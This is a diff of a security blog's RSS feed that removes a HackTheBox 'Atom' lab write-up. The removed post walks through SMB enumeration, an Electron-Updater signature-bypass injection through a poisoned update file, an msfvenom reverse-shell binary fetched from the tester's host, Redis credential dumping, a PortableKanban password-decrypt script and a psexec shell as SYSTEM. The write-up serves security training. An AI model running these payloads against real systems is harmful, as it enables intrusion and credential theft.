@@ -5,349 +5,7 @@
     <link>https://fahmifj.github.io/tags/psexec.py/</link>
     <description>Recent content in psexec.py on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sat, 10 Jul 2021 20:28:32 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/psexec.py/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>HackTheBox - Atom</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</link>
-      <pubDate>Sat, 10 Jul 2021 20:28:32 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</guid>
-      <description>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server.</description>
-      <content:encoded><![CDATA[<p>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server. I&rsquo;m able to obtain administrator credentials by dumping the Redis database.</p>
-<h3 id="skills-learned">Skills Learned</h3>
-<ul>
-<li>Exploitation of Electron-Builder app through auto-update.</li>
-<li>Redis enumeration</li>
-</ul>
-<h3 id="tools">Tools</h3>
-<ul>
-<li>Nmap</li>
-<li>CrackMapExec</li>
-<li>Msfvenom</li>
-<li>Netcat</li>
-<li>Impacket</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>A full TCP scan with <code>nmap</code> discovers six open ports: HTTP on 80 and its secure version on 443, MSRPC on 135, SMB on 445, WinRM on 5985 and Redis on 6379.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
-$ nmap -p- --max-rate <span style="color:#ae81ff">1000</span> -sV --reason -oA nmap/10-tcp-allport-atom 10.10.10.237
-Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-17 07:56 EDT
-Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.237
-Host is up, received echo-reply ttl <span style="color:#ae81ff">127</span> <span style="color:#f92672">(</span>0.051s latency<span style="color:#f92672">)</span>.
-Not shown: <span style="color:#ae81ff">65529</span> filtered ports
-Reason: <span style="color:#ae81ff">65529</span> no-responses
-PORT     STATE SERVICE      REASON          VERSION
-80/tcp   open  http         syn-ack ttl <span style="color:#ae81ff">127</span> Apache httpd 2.4.46 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
-135/tcp  open  msrpc        syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
-443/tcp  open  ssl/http     syn-ack ttl <span style="color:#ae81ff">127</span> Apache httpd 2.4.46 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
-445/tcp  open  microsoft-ds syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows <span style="color:#ae81ff">7</span> - <span style="color:#ae81ff">10</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
-5985/tcp open  http         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
-6379/tcp open  redis        syn-ack ttl <span style="color:#ae81ff">127</span> Redis key-value store
-Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 153.92 seconds
-</code></pre></div><p>A script scan doesn&rsquo;t really helpful, so I&rsquo;ll skip that here.</p>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-6379---redis">TCP 6379 - Redis</h3>
-<p>On Redis, authenticated is required.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «smb» «10.10.14.49» 
-$ nc -nv 10.10.10.237 <span style="color:#ae81ff">6379</span>
-<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.237<span style="color:#f92672">]</span> <span style="color:#ae81ff">6379</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
-INFO
--NOAUTH Authentication required.
-</code></pre></div><h3 id="tcp-445---smb">TCP 445 - SMB</h3>
-<p>SMB enumeration with Anonymous logon using <code>crackmapexec</code> reveals the Windows version and one writable share.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
-$ crackmapexec smb 10.10.10.237 -u <span style="color:#e6db74">&#39;ANONYMOUS&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
-SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> Pro <span style="color:#ae81ff">19042</span> x64 <span style="color:#f92672">(</span>name:ATOM<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:ATOM<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
-SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ATOM<span style="color:#ae81ff">\A</span>NONYMOUS: 
-SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated shares
-SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             Share           Permissions     Remark
-SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             -----           -----------     ------
-SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             ADMIN$                          Remote Admin
-SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             C$                              Default share
-SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             IPC$                            Remote IPC
-SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             Software_Updates READ,WRITE      
-</code></pre></div><h4 id="software_updates-share">Software_Updates Share</h4>
-<p>In <code>Software_Updates</code>, there is a PDF file called <code>UAT_Testing_Procedures.pdf</code>. I&rsquo;ll grab that file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
-$ smbclient -N //10.10.10.237/Software_Updates
-Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
-smb: <span style="color:#ae81ff">\&gt;</span> dir
-  .                                   D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
-  ..                                  D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
-  client1                             D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
-  client2                             D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
-  client3                             D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
-  UAT_Testing_Procedures.pdf          A    <span style="color:#ae81ff">35202</span>  Fri Apr  <span style="color:#ae81ff">9</span> 07:18:08 <span style="color:#ae81ff">2021</span>
-
-                <span style="color:#ae81ff">4413951</span> blocks of size 4096. <span style="color:#ae81ff">1361569</span> blocks available
-smb: <span style="color:#ae81ff">\&gt;</span> recurse on
-smb: <span style="color:#ae81ff">\&gt;</span> prompt off
-smb: <span style="color:#ae81ff">\&gt;</span> mget *
-getting file <span style="color:#ae81ff">\U</span>AT_Testing_Procedures.pdf of size <span style="color:#ae81ff">35202</span> as UAT_Testing_Procedures.pdf <span style="color:#f92672">(</span>121.5 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 121.5 KiloBytes/sec<span style="color:#f92672">)</span>
-</code></pre></div><h3 id="tcp-80443---website">TCP 80,443 - Website</h3>
-<p>Both port 80 and 443 are displaying a software company site called &ldquo;Heed Solutions&rdquo;.</p>
-<p><img class="img-container" src="imgs/image-20210517190515610.png" alt="image-20210517190515610"  />
-</p>
-<p>At the bottom, there is a hostname and a download link that points to <code>http://10.10.10.237/releases/heed_setup_v1.0.0.zip</code>.</p>
-<p><img class="img-container" src="imgs/image-20210517190532910.png" alt="image-20210517190532910"  />
-</p>
-<p>I&rsquo;ll add the hostname to my <code>/etc/hosts</code> file and then download the previous software.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
-$ echo <span style="color:#e6db74">&#39;10.10.10.237 atom.htb&#39;</span> &gt;&gt; /etc/hosts
-</code></pre></div><p>After the hostname added, the site still shows the same content.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
-$ curl -s -k https://10.10.10.237/ | wc -c
-<span style="color:#ae81ff">7581</span>
-→ root@kali «atom» «10.10.14.49» 
-$ curl -s -k http://10.10.10.237/ | wc -c 
-<span style="color:#ae81ff">7581</span>
-→ root@kali «atom» «10.10.14.49» 
-$ curl -s -k http://atom.htb/ | wc -c
-<span style="color:#ae81ff">7581</span>
-→ root@kali «atom» «10.10.14.49» 
-$ curl -s -k https://atom.htb/ | wc -c
-<span style="color:#ae81ff">7581</span>
-</code></pre></div><h3 id="analysis">Analysis</h3>
-<p>The previous zip file contains one executable file called <code>heedv1 Setup 1.0.0.exe</code>.</p>
-<pre><code>→ root@kali «loot» «10.10.14.49» 
-$ file heedv1_setup_1.0.0.exe 
-heedv1_setup_1.0.0.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive
-</code></pre><p>It says &ldquo;self-extracting archive&rdquo;, meaning it can be extracted, for example using <code>7z</code>.</p>
-<p>While looking into the app structure, I spotted a file called <code>app-update.yml</code>.</p>
-<pre><code>→ root@kali «heed_extracted» «10.10.14.49» 
-$ tree
-.
-├── $PLUGINSDIR
-│   ├── app-64
-...&lt;SNIP&gt;...
-│   │   ├── natives_blob.bin
-│   │   ├── resources
-│   │   │   ├── app.asar
-│   │   │   ├── app-update.yml # ==&gt; Updater config
-│   │   │   ├── electron.asar
-│   │   │   ├── elevate.exe
-│   │   │   └── inspector
-...&lt;SNIP&gt;...
-
-73 directories, 274 files
-</code></pre><p>The file contains another hostname, which I&rsquo;ll add it to <code>/etc/hosts</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
-$ cat ./<span style="color:#ae81ff">\$</span>PLUGINSDIR/app-64/resources/app-update.yml
-provider: generic
-url: <span style="color:#e6db74">&#39;http://updates.atom.htb&#39;</span>
-publisherName:
-  - HackTheBox
-</code></pre></div><p>And again, it is the same site.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
-$ curl -s http://updates.atom.htb/ | wc -c
-<span style="color:#ae81ff">7581</span>
-</code></pre></div><p>Guessing based on the content of <code>UAT_Testing_Procedures.pdf</code> file from SMB enumeration, <code>heedv1_setup_1.0.0.exe </code> is currently on testing phase. Other information that I can obtain are:</p>
-<ul>
-<li>The app is packed with electron-builder</li>
-<li>The app has auto-update feature, but before releasing the updated app, the QA team will test it first.</li>
-</ul>
-<p><img class="img-container" src="imgs/image-20210517200229002.png" alt="image-20210517200229002"  />
-</p>
-<p>According to the image above, the <code>client</code> folder here probably refers to the ones on SMB.</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-jason">Shell as Jason</h3>
-<h4 id="rce-electron-updater---background">RCE Electron-Updater - Background</h4>
-<p>I went to the rabbit hole by analyzing the executable file. At first, I thought I could inject the <code>app-update.yml</code> to point to my malicious <code>.exe</code> file and repack the app. I got the idea of poisoning the update file but didn&rsquo;t know where to start until I found this <a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">blog</a>.</p>
-<p>According to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check of the new version of binary file.</p>
-<pre><code>execFile(&quot;powershell.exe&quot;, [&quot;-NoProfile&quot;, &quot;-NonInteractive&quot;, &quot;-InputFormat&quot;, &quot;None&quot;, &quot;-Command&quot;, `Get-AuthenticodeSignature '${tempUpdateFile}' | ConvertTo-Json -Compress`], {
-...&lt;SNIP&gt;...
-</code></pre><p>If <code>${tempUpdateFile}</code> is a user-controlled input, this can be leveraged for command injection: <code>';calc;'</code></p>
-<blockquote>
-<p><em>Since the <code>${tempUpdateFile}</code> variable is provided unescaped to the <code>execFile</code> utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.</em></p>
-</blockquote>
-<p>The following is an example of malicious update definition that will pop a calculator.</p>
-<pre><code>version: 2.0.0
-path: u';calc;'pdate.exe
-sha512: qwP35Rn5PLaBoZ8tzvRFK...&lt;SNIP&gt;...LM3WCmvJUXMYmZGW6T+fI=
-releaseDate: '2021-01-24T13:44:59.064Z'
-</code></pre><p>Sending this <code>u';payload;'pdate.exe</code> as path would be troublesome, which is simplified as follows:</p>
-<pre><code>`Get-AuthenticodeSignature 'u';payload;'pdate.exe' | ConvertTo-Json -Compress`
-</code></pre><p>Now that if a single quote <code>'</code> is added to <code>path</code>, which becomes:</p>
-<pre><code>`Get-AuthenticodeSignature 'u'pdate.exe' | ConvertTo-Json -Compress`
-</code></pre><p>But then, it would breaks the signature verification.</p>
-<p>And here&rsquo;s come the interesting part, an attacker could easily bypass this signature verification by recalculating the hash of <code>u'pdate.exe</code>. That&rsquo;s very clever, right?</p>
-<h4 id="rce-electron-updater---exploitation">RCE Electron-Updater - Exploitation</h4>
-<p>According to the SMB enumeration, all the <code>client</code> folders are writable, which means exploitation can be done in two ways: local and remote. But, I&rsquo;ll go with remote 😅.</p>
-<p>First, I&rsquo;ll have to generate a reverse shell binary. This can be done with <code>msfvenom</code>. I&rsquo;ll host this binary using Python web server afterwards.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
-$ msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.49 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">53</span> -f exe -o i<span style="color:#ae81ff">\&#39;</span>amf.exe
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
-No encoder or badchars specified, outputting raw payload
-Payload size: <span style="color:#ae81ff">460</span> bytes
-Final size of exe file: <span style="color:#ae81ff">7168</span> bytes
-Saved as: i<span style="color:#960050;background-color:#1e0010">&#39;</span>amf.exe
-</code></pre></div><p>Next, I&rsquo;ll need to calculate the hash of <code>i'amf.exe</code> using the following command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
-$ shasum -a <span style="color:#ae81ff">512</span> i<span style="color:#ae81ff">\&#39;</span>amf.exe | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f1 | xxd -r -p | base64 | tr -d <span style="color:#e6db74">&#39;\n&#39;</span>
-Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw<span style="color:#f92672">==</span>
-</code></pre></div><p>The last thing I need is the update file. I&rsquo;ll create one called <code>update-iamf.yml</code>  which contains the following update definitions:</p>
-<pre><code>version: 2.0.1
-path: http://10.10.14.83/i'amf.exe
-sha512: Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw==
-releaseDate: '2021-01-24T13:44:59.064Z'
-</code></pre><p>I&rsquo;ll upload the update file to <code>Software_Updates</code> share using <code>smbclient</code>  and start a netcat listener. After a few minutes, the reverse shell binary connected to my listener.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.49» 
-$ smbclient -N //10.10.10.237/Software_Updates -c &#34;put iamf-update.yml client1/latest.yml&#34;  &amp;&amp; nc -nvlp 53
-putting file iamf-update.yml as \client1\latest.yml (1.1 kb/s) (average 1.1 kb/s)
-listening on [any] 53 ...
-connect to [10.10.14.49] from (UNKNOWN) [10.10.10.237] 64352
-Microsoft Windows [Version 10.0.19042.906]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\WINDOWS\system32&gt;whoami
-whoami
-atom\jason
-
-C:\WINDOWS\system32&gt;
-</code></pre></div><p><img class="img-container" src="imgs/image-20210517220650699.png" alt="image-20210517220650699"  />
-</p>
-<p>User flag is done here.</p>
-<pre><code>C:\Users\jason\Desktop&gt;type user.txt
-type user.txt
-b77e754354e186f...&lt;SNIP&gt;...
-</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-system">Shell as SYSTEM</h3>
-<h4 id="internal-enumeration">Internal Enumeration</h4>
-<p>WinPEAS discovers a set of credentials for user <code>jason</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
-[+] Checking Credential manager
-   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
-    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
-
-
-     Username:              ATOM\jason
-     Password:               kidvscat_electron_@123
-     Target:                ATOM\jason
-     PersistenceType:       Enterprise
-     LastWriteTime:         3/31/2021 2:53:49 AM
-</code></pre></div><p>On Jason&rsquo;s download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp (I&rsquo;ve not been able to pwn it, though 😂).  Its config contains encrypted Redis database password (The clear password revealed in the next section).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Users\jason\Downloads&gt;type PortableKanban\PortableKanban.cfg
-type PortableKanban\PortableKanban.cfg
-{&#34;RoamingSettings&#34;:{&#34;DataSource&#34;:&#34;RedisServer&#34;,&#34;DbServer&#34;:&#34;localhost&#34;,&#34;DbPort&#34;:6379,&#34;DbEncPassword&#34;:&#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&#34;
-...&lt;SNIP&gt;...
-</code></pre></div><h4 id="redis-revisited">Redis Revisited</h4>
-<p>Looking into the Redis installation folder, I find a plain password in <code>redis.windows.conf</code> file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows.conf | findstr requirepass
-type redis.windows.conf | findstr requirepass
-requirepass kidvscat_yes_kidvscat
-</code></pre></div><p><code>redis.windows-service.conf</code> also contains the same password.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows-service.conf | findstr requirepass
-type redis.windows-service.conf | findstr requirepass
-requirepass kidvscat_yes_kidvscat
-</code></pre></div><p>The password <code>kidvscat_yes_kidvscat</code> works on Redis.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
-$ rlwrap nc -nv 10.10.10.237 <span style="color:#ae81ff">6379</span>
-<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.237<span style="color:#f92672">]</span> <span style="color:#ae81ff">6379</span> <span style="color:#f92672">(</span>redis<span style="color:#f92672">)</span> open
-AUTH jason kidvscat_electron_@123
--ERR wrong number of arguments <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;auth&#39;</span> command
-AUTH kidvscat_electron_@123
--ERR invalid password
-AUTH kidvscat_yes_kidvscat
-+OK
-</code></pre></div><p>It&rsquo;s possible to dump the database that is currently in use.</p>
-<p>To do that, I&rsquo;ll send <code>INFO</code> command and starting to look for a chunk called <code>Keyspace</code> .</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">INFO
-$1938
-# Server
-redis_version:3.0.504
-...&lt;SNIP&gt;...
-# Keyspace
-db0:keys=4,expires=0,avg_ttl=0
-</code></pre></div><p>There is one database active, which is <code>db0</code> and it contains 4 keys.</p>
-<p>I&rsquo;ll send <code>KEYS *</code> command to get all the stored keys.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">SELECT 0
-+OK
-KEYS *
-*4
-$48
-pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
-$11
-pk:ids:User
-$20
-pk:ids:MetaDataClass
-$57
-pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff
-</code></pre></div><p>The value of <code>pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</code> contains a credentials of the Administrator account, but the password is encrypted.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">GET</span> <span style="color:#960050;background-color:#1e0010">pk:urn:user:e</span><span style="color:#ae81ff">8e29158</span><span style="color:#960050;background-color:#1e0010">-d</span><span style="color:#ae81ff">70</span><span style="color:#960050;background-color:#1e0010">d</span><span style="color:#ae81ff">-44</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">-a</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">ba</span><span style="color:#ae81ff">-4949</span><span style="color:#960050;background-color:#1e0010">d</span><span style="color:#ae81ff">52790</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">0</span>
-<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">207</span>
-{<span style="color:#f92672">&#34;Id&#34;</span>:<span style="color:#e6db74">&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;</span>,<span style="color:#f92672">&#34;Name&#34;</span>:<span style="color:#e6db74">&#34;Administrator&#34;</span>,<span style="color:#f92672">&#34;Initials&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;Email&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;EncryptedPassword&#34;</span>:<span style="color:#e6db74">&#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#34;</span>,<span style="color:#f92672">&#34;Role&#34;</span>:<span style="color:#e6db74">&#34;Admin&#34;</span>,<span style="color:#f92672">&#34;Inactive&#34;</span>:<span style="color:#66d9ef">false</span>,<span style="color:#f92672">&#34;TimeStamp&#34;</span>:<span style="color:#ae81ff">637530169606440253</span>}
-</code></pre></div><h4 id="portablekanban-decrypt">PortableKanban Decrypt</h4>
-<p>By assuming that the password is encrypted using PortableKanban, I could try to decrypt the password I obtained using the following <a href="https://github.com/fahmifj/PortableKanban-decrypt/blob/main/pk-decrypt.py">script</a>  (a modified version of the original exploit).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">from base64 import b64decode
-import sys
-import des 
-
-key <span style="color:#f92672">=</span> des.DesKey<span style="color:#f92672">(</span>b<span style="color:#e6db74">&#39;7ly6UznJ&#39;</span><span style="color:#f92672">)</span>
-iv <span style="color:#f92672">=</span> b<span style="color:#e6db74">&#39;XuVUm5fR&#39;</span>
-
-try:    
-	passwd <span style="color:#f92672">=</span> b64decode<span style="color:#f92672">(</span>sys.argv<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>.encode<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;UTF-8&#39;</span><span style="color:#f92672">))</span>
-except IndexError:
-	print<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;[-] Usage: %s &lt;base64_encrypted_passwd&gt;&#39;</span> % sys.argv<span style="color:#f92672">[</span>0<span style="color:#f92672">])</span>
-    
-	sys.exit<span style="color:#f92672">(</span>-1<span style="color:#f92672">)</span>
-
-dec_password <span style="color:#f92672">=</span> key.decrypt<span style="color:#f92672">(</span>passwd, initial<span style="color:#f92672">=</span>iv, padding<span style="color:#f92672">=</span>True<span style="color:#f92672">)</span>
-print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[+] Decrypted Password: &#34;</span> + dec_password.decode<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;UTF-8&#39;</span><span style="color:#f92672">))</span>
-</code></pre></div><p>The administrator password has been decrypted to <code>kidvscat_admin_@123</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «atom» «10.10.14.83»
-$ python3 pk-decrypt.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Decrypted Password: kidvscat_admin_@123
-</code></pre></div><h4 id="psexecpy">psexec.py</h4>
-<p>I could use the credentials in psexec from impacket to obtain interactive shell access as system.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «atom» «10.10.14.49» 
-$ impacket-psexec atom/administrator:&#39;kidvscat_admin_@123&#39;@10.10.10.237
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-
-[*] Requesting shares on 10.10.10.237.....
-[*] Found writable share ADMIN$
-[*] Uploading file FCSITnEj.exe
-[*] Opening SVCManager on 10.10.10.237.....
-[*] Creating service DCLl on 10.10.10.237.....
-[*] Starting service DCLl.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.19042.906]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\WINDOWS\system32&gt;whoami &amp;&amp; hostname
-nt authority\system
-ATOM
-
-C:\WINDOWS\system32&gt;ipconfig
-
-Windows IP Configuration
-
-
-Ethernet adapter Ethernet0:
-
-   Connection-specific DNS Suffix  . :
-   IPv6 Address. . . . . . . . . . . : dead:beef::525:3f10:5c90:26bf
-   Temporary IPv6 Address. . . . . . : dead:beef::cc8a:70e1:ba06:84ed
-   Link-local IPv6 Address . . . . . : fe80::525:3f10:5c90:26bf%6
-   IPv4 Address. . . . . . . . . . . : 10.10.10.237
-   Subnet Mask . . . . . . . . . . . : 255.255.255.0
-   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
-                                       10.10.10.2
-</code></pre></div><hr>
-<h2 id="references">Reference(s)</h2>
-<ul>
-<li><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></li>
-<li><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></li>
-<li><a href="https://www.exploit-db.com/exploits/49409">https://www.exploit-db.com/exploits/49409</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
+    <lastBuildDate>Fri, 23 Apr 2021 17:09:02 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/psexec.py/index.xml" rel="self" type="application/rss+xml" />
     <item>
